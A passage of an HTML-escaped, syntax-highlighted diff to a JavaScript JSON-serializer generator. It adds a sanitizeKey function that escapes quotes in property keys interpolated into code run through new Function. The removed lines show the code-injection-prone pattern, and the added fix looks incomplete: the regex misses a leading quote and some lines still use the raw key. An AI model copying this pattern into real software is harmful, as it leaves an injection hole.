\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e493\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erefFinder\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eref\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eschema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e))(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitizeKey\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e([^\\\\])\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e$1\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\n \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"nb\"\u003eObject\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ekeys\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e{}).\u003c/span\u003e\u003cspan class=\"nx\"\u003eforEach\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e$ref\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e502\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e508\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e13\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n     \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e\n     \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003enullable\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003enullable\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitizeKey\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enullable\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-        if (obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;] === null) {\n+        if (obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;] === null) {\n           \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-          json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:null\u0026#39;\n+          json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:null\u0026#39;\n           var rendered = true\n         } else {\n       `\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e515\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e522\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enumber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-          var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n+          var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n           if (!isNaN(t)) {\n             \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-            json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n+            json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n       `\u003c/span\u003e\n     \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einteger\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n@@ -526,25 +533,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\u003c/span\u003e\n       \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisLong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n         \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-            if (isLong(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])) {\n+            if (isLong(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])) {\n               \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;].toString()\n+              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n+              var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n               if (!isNaN(t)) {\n                 \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-                json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n+                json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n                 rendered = true\n               }\n             }\n         `\u003c/span\u003e\n       \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n         \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-            var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n+            var t = Number(obj[\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;])\n             if (!isNaN(t)) {\n               \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n-              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n+              json += \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u0026#39; + t\n               rendered = true\n             }\n         `\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e554\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e561\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"s2\"\u003e`\n     } else {\n       code += `\u003c/span\u003e\n\u003cspan class=\"o\"\u003e-\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${key}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"kc\"\u003eundefined\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${sanitized}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"kc\"\u003eundefined\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n           \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n           \u003cspan class=\"nx\"\u003ejson\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${$asString(key)}:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n         \u003cspan class=\"s2\"\u003e`\n@@ -569,12 +576,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\u003c/span\u003e\n       \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n         \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddComma\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e-\u003c/span\u003e        \u003cspan class=\"nx\"\u003ejson\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e${$asString(key)}:${JSON.stringify(defaultValue).replace(/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\n+        json += \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003e$asString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e)}:\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edefaultValue\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u0026#39;/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\n       `\n     } else if (schema.required \u0026amp;\u0026amp; schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"nx\"\u003eis\u003c/span\u003e \u003cspan 